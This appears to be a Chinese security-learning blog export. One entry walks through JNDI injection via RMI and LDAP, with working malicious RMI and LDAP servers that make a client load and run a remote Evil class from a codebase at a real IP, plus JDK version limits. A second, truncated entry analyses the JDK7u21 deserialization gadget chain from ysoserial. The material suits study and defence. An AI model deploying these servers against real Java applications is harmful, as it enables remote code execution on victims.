<h3 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h3><p>JNDI(Java Naming and Directory Interface，Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。两者之间的关键差别是目录服务中对象不但可以有名称还可以有属性（例如，用户有email地址），而命名服务中对象没有属性。</p>
<p>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作，还可以通过（LDAP）。再提一下RMI：</p>
<blockquote>
<p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。相当于利用RMI去动态加载类，RMI服务那里绑定了一个对象，然后通过<code>JNDI</code> 去获取RMI对应的绑定的那个对象。</p>
</blockquote>
<p>通过得到的RMI服务端那里的对象，然后调用方法，实际上是在RMI服务那边执行的，也就是说这样攻击的是服务端，那如何攻击客户端呢。</p>
<blockquote>
<p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
</blockquote>
<p>当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，得到的是一个 <code>Reference</code> 类的存根，由于获取的是一个 <code>Reference</code> 实例，客户端会首先去本地的 CLASSPATH 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <a href="http://ip:port/refClassName.class">http://ip:port/refClassName.class</a> 动态加载 classes 并调用 <code>insClassName</code> 的构造函数、静态代码块、getObjectInstance()等。这些地方都可以写入恶意代码。而且这个调用是在客户端，而不是在服务端。这就实现了客户端的命令执行。</p>
<h3 id="JNDI-RMI代码测试"><a href="#JNDI-RMI代码测试" class="headerlink" title="JNDI+RMI代码测试"></a>JNDI+RMI代码测试</h3><p>客户端代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://42.194.149.25:8111/test&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;42.194.149.25&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">8111</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">feng</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;http://42.194.149.25:8112/&quot;</span>);<span class="comment">//构造出一个Reference对象,第一个className用处不大，第二个参数factory是用来指定类名的，第三个参数就是当CLASSPATH找不到指定的类的时候，去搜索的远程URL路径了。也就是查找http://42.194.149.25:8112/Evil.class</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(feng);</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再写一个<code>Evil.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>Evil.java</code>编译好</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617141531834-1579649378.png" alt="image-20220617141530737"></p>
<p>运行客户端代码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617163834494-1141739286.png" alt="image-20220617163834298"></p>
<p>这里弄了很久，之前运行一直显示timeout，后面调试发现，在rmi通信的时候是启用了一个随机端口比如44567，vps因为有安全组所以一直连不上，把安全组策略打开即可。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164110192-943870745.png" alt="image-20220617164109795"></p>
<h3 id="JNDI-RMI调试分析"><a href="#JNDI-RMI调试分析" class="headerlink" title="JNDI+RMI调试分析"></a>JNDI+RMI调试分析</h3><p>在lookup函数处打上断点</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164309402-241499107.png" alt="image-20220617164309349"></p>
<p>跟进<code>rmiURLContext#lookup</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164322491-1242926316.png" alt="image-20220617164322361"></p>
<p>通过<code>rmiURLContext#getRootURLContext</code>拿到var2，var2如下，里面把包括远程主机和对应的端口，以及绑定对象的名字</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164753272-151728509.png" alt="image-20220617164753147"></p>
<p>继续跟进<code>var3#lookup</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165035151-1967729845.png" alt="image-20220617165035321"></p>
<p>通过<code>this.registry#lookup</code>方法拿到RMI绑定的对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165354472-424846252.png" alt="image-20220617165354526"></p>
<p>向下，跟进<code>decodeObject()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165531472-280695840.png" alt="image-20220617165531724"></p>
<p>这里先判断var1是否是<code>ReferenceWrapper</code>类的对象，它<code>implements RemoteReference</code>了，所以会调用<code>getReference()</code>，获取<code>Reference</code>对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617172709689-478528339.png" alt="image-20220617172709570"></p>
<p>进入<code>NamingManager.getObjectInstance</code>，前面通过一些if语句的判断，重点是下面这几行代码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617172958332-1022715033.png" alt="image-20220617172958249"></p>
<p>跟进<code>getObjectFactoryFromReference()</code>函数，<code>clas = helper.loadClass(factoryName);</code>这里是本地类加载，因为找不到<code>Evil</code>类所以会加载失败。继续往下在<code>codebase = ref.getFactoryClassLocation()</code>中，<code>FactoryClassLocation</code>就是我们请求的URL，并赋值给<code>codebase</code>，下面就通过<code>URLClassLoader</code>远程加载类，跟进<code>loadClass()</code>方法，获取<code>URLClassLoader</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617174419754-846853933.png" alt="image-20220617174420127"></p>
<p>再跟进<code>loadClass()</code>方法，可以看到这里用<code>Class.forName</code>加载类且第二个参数是true（默认也是true）会进行类的加载，也就是静态代码块。因此这时候静态代码块的代码可以执行。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617174351473-1380822828.png" alt="image-20220617174351661"></p>
<p>成功加载到了clas后，再<code>return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</code>，调用它的newInstance()进行实例化，从而调用了无参构造器，执行了无参构造器里面的代码，因此可以将恶意代码放入无参构造器中。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617173457303-1784389861.png" alt="image-20220617173457054"></p>
<p>回到<code>getObjectFactoryFromReference()</code>调用处，继续往下，可以发现还会调用<code>getObjectInstance()</code>方法，因此也可以把代码写到<code>getObjectInstance</code>方法中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617175505587-983781106.png" alt="image-20220617175505727"></p>
<p>调用链大致如下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617182136384-338384993.png" alt="image-20220617182136524"></p>
<p>JNDI注入利用RMI的话，版本会受到极大的限制。</p>
<h3 id="JNDI-LDAP代码测试"><a href="#JNDI-LDAP代码测试" class="headerlink" title="JNDI+LDAP代码测试"></a>JNDI+LDAP代码测试</h3><p>LDAP是轻型目录访问协议（英文：Lightweight Directory Access Protocol，缩写：LDAP）是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。</p>
<p>因为RMI会受到限制，所以就有了JNDI+LDAP的注入方式。</p>
<blockquote>
<p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p>
<p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。</p>
</blockquote>
<p>服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_Server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8112/#Evil&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8111</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:8111/Evil&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617223744211-553424588.png" alt="image-20220617223742062"></p>
<h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><h4 id="RMI版本限制"><a href="#RMI版本限制" class="headerlink" title="RMI版本限制"></a>RMI版本限制</h4><p>这里还需要说下在 当RMI客户端引用远程对象将受本地Java环境限制，即本地的<code>java.rmi.server.useCodebaseOnly</code>配置必须为<code>false</code>(允许加载远程对象)，如果该值为true则禁止引用远程对象。</p>
<p>所以这里如果我们进行利用的话，客户端的RMI启动的时候就需要设置<code>useCodebaseOnly</code></p>
<p>java在6u45、7u21开始<code>java.rmi.server.useCodebaseOnly</code>默认配置已经改为了<code>true</code>。</p>
<p>在javasec中看到说是8u121开始<code>java.rmi.server.useCodebaseOnly</code>默认配置已经改为了<code>true</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617180421366-1985012742.png" alt="image-20220617180420743"></p>
<p>除此之外被引用的<code>ObjectFactory</code>对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为false(不信任远程引用对象)则无法调用远程的引用对象。</p>
<p>rmi的jndi在6u132，7u122，8u113 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值已改为了false。</p>
<p>如果想要通过rmi的jndi进行加载恶意类，在jdk8中，版本就可以适用到113。</p>
<p>如下为jdk8u321的测试结果：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617182734589-490760347.png" alt="image-20220617182734089"></p>
<h4 id="LDAP版本限制"><a href="#LDAP版本限制" class="headerlink" title="LDAP版本限制"></a>LDAP版本限制</h4><p>然后再说下ldap的jndi，ldap的jndi在6u211、7u201、8u191、11.0.1后也将默认的<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为了false。</p>
<p>这里就是为什么进行JNDI注入的时候用LDAP会通用，因为我们如果想要通过ldap的jndi进行加载恶意类，在jdk8中，版本就可以适用到8u191</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617181311638-1405806032.png" alt="image-20220617181311507"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/rfrder/article/details/120048519">https://blog.csdn.net/rfrder/article/details/120048519</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13958047.html">https://www.cnblogs.com/nice0e3/p/13958047.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Jdk7u21链分析</title>
    <url>/2022/06/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BJdk7u21%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面的cc链都是第三方组件的利用链，现在学习下JDK7u21的原生反序列化链。</p>
<span id="more"></span>

<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>JDK7u21这个版本以及之前时间发布的所有Java版本都有问题。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618000917681-667491552.png" alt="image-20220618000915777"></p>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>引入<code>javassist</code>，下面用到<code>javassist</code>就是为了方便生成恶意类的字节码，而且版本要低一些，高版本不兼容jdk7，只能用jdk8及其更高版本。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">    &lt;maven.compiler.source&gt;<span class="number">7</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">    &lt;maven.compiler.target&gt;<span class="number">7</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.20</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>7u21这条链核心就在于<code>AnnotationInvocationHandler</code>这个类。联想到CC1的时候第一次接触它，这个类有两种利用思路，一种是利用它的<code>readObject()</code>，另一种就是利用它的<code>invoke()</code>，因为<code>AnnotationInvocationHandler</code>是一个实现了<code>InvocationHandler</code>接口的类，可以应用于动态代理中。</p>
<p>看下yso中给出的调用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (<span class="number">0</span>)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看下yso中的poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">		<span class="type">String</span> <span class="variable">zeroHashCodeStr</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">		Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">		<span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">		<span class="type">LinkedHashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>(); <span class="comment">// maintain order</span></span><br><span class="line">		set.add(templates);</span><br><span class="line">		set.add(proxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">		Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">		map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> set;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>

<p>进到方法中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618173503665-1663655389.png" alt="image-20220618173503107"></p>
<p>最后调用了它的重载方法，方法中，首先对传入的<code>TemplatesImpl</code>进行了实例化，然后用<code>javassist</code>动态创建了一个恶意类</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618173822265-841791307.png" alt="image-20220618173821584"></p>
<p>最后这段代码使用了<code>Reflections.setFieldValue</code>把<code>templates</code>里面的<code>_bytecodes</code>设置为前面动态创建的类的字节码。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618180930411-355270625.png" alt="image-20220618180929673"></p>
<p><code>setFieldValue()</code>是通过反射去实现的</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618181515069-1298862479.png" alt="image-20220618181513584"></p>
<p>继续往下看</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618182655940-1693753912.png" alt="image-20220618182654963"></p>
<p>查看一下<code>Reflections.getFirstCtor</code>方法，内部就是使用反射创建一个无参构造的对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618182812273-1966081817.png" alt="image-20220618182811857"></p>
<p>传递的name就是<code>AnnotationInvocationHandler</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618182952528-91648397.png" alt="image-20220618182952209"></p>
<p><code>Reflections.getFirstCtor</code>方法返回<code>AnnotationInvocationHandler</code>对象，然后调用<code>newInstance</code>实例化该对象，传入构造方法中的参数是<code>Override.class</code>和<code>map</code>，这个在cc链学习的时候页接触到过这种传参方式。</p>
<p>下面这段代码和之前一样通过反射将<code>tempHandler</code>里面的<code>type</code>的变量改成<code>Templates.class</code></p>
